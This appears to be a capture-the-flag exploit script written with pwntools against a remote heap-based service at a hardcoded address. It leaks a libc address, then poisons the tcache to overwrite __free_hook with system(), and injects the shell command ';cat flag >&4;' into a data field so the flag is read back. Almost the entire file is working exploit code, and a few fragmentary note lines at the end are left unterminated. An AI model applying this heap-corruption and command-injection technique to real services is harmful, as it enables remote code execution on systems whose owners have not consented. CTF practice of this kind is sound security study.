from pwn import *
from base64 import b64encode as b64e
from urllib import urlencode

libc = ELF('/home/xion/Desktop/GoN/glibc/2.31/libc-2.31.so')

def _del(data_len, data):
    return 'd' + p32(data_len) + data

def _lst(data_len, data, st=None, en=None):
    if st is None or en is None:
        return 'l' + p32(data_len) + data
    return 'l' + p32(data_len) + data + p32(st) + p32(en)

def _alloc(data_len, data, ctr, data2_len, data2):
    return 'a' + '\x01' + p32(data_len) + data + p32(ctr) + '\x01' + p32(data2_len) + data2

def spawn():
    if DEBUG:
        #return remote('127.0.0.1', 7777)
        return remote('192.168.190.131', 7777)
    else:
        return remote(IP, PORT)

def sender(p, payload):
    if DEBUG:
        p.send(payload)
    else:
        p.send('GET /?qry={}&count=1_end HTTP/1.1\r\nHost: {}\r\nUser-Agent: Kwangho Park computer\r\n\r\n'.format(b64e(payload).replace('+', '%2b'), IP))

DEBUG = False
IP, PORT = '18.191.179.138', 80
context.log_level = 'debug'

#"""
# 1. leak libc address
p = spawn()

payload  = ''
payload += _alloc(4, 'test', 0x80000000, 0x8, 'A'*0x8)
payload += _alloc(5, 'test2', 0x210, 0x8, 'A'*0x8)
payload += _del(5, 'test2')
payload += _lst(4, 'test', 28*8, (28+1)*8)  # leak offset i = 28, libc ofs 00000000001ebbe0
payload += 'E'
payload  = payload.ljust(800, 'A')

assert(len(payload)<=800)

sender(p, payload)

p.interactive()

p.recvuntil('var test = ')
libc.address = u64(p.recv(6).ljust(8, '\x00')) - 0x00000000001ebbe0
log.success('libc: {:016x}'.format(libc.address))

p.close()
#"""

#libc.address = 0x7f11ca030000

# 2. overwrite __free_hook
p = spawn()

payload  = ''

payload += _alloc(14, ';cat flag >&4;', 0x80000000, 9, p64(libc.symbols['system'])+'\0')

payload += _alloc(1, '1', 0x24, 1, '1')  # malloc(0x50)
payload += _alloc(1, '2', 0x24, 1, '2')  # malloc(0x50)
payload += _alloc(1, '3', 0x24, 1, '3')  # malloc(0x50)
payload += _alloc(1, '4', 0x24, 1, '4')  # malloc(0x50)
payload += _alloc(1, '5', 0x24, 1, '5')  # malloc(0x50)
payload += _alloc(1, '6', 0x24, 1, '6')  # malloc(0x50)
payload += _alloc(2, 'OW', 0x24, 1, '7')  # malloc(0x50)

payload += _del(0x70, 'A'*0x70)  # malloc(0x70), tc1
payload += _alloc(2, 'OW', 0x24, 1, 'A')  # malloc(0x50), prev 'OW' data2 buffer freed
payload += _del(0x70, 'B'*0x70)  # malloc(0x70), tc2 | 0x70 tcache: tc2 -> tc1 -> NULL

payload += _del(1, '1')
payload += _del(1, '2')
payload += _del(1, '3')
payload += _del(1, '4')
payload += _del(1, '5')
payload += _del(1, '6')  # fill 0x50 tcache
payload += _del(2, 'OW')  # 0x50 fastbin

payload += _alloc(4, 'yeee', 0x80000023, 0x68, 'A'*0x58+p64(0x81)+p64(libc.symbols['__free_hook']))  # 0x70 tcache: tc2 -> __free_hook

payload += _lst(14, ';cat flag >&4;', 0, 0x70)  # 0x70 tcache: __free_hook -> NULL
payload += _lst(14, ';cat flag >&4;', 0, 0x70)  # 0x70 tcache: NULL, __free_hook = system@libc
# system("var ;cat flag >&4; = ~~~")

payload += 'E'
payload  = payload.ljust(800, 'A')

assert(len(payload)<=800)

sender(p, payload)

#p.recvuntil('var test = ')
p.interactive()

p.recvuntil('flag{')
print('flag{' + p.recvuntil('}'))

data
'd' + p32(data_len) + 


'l' + p32(data_len) + data + (if found...) p32(start_ofs) + p32(end_ofs)
"""
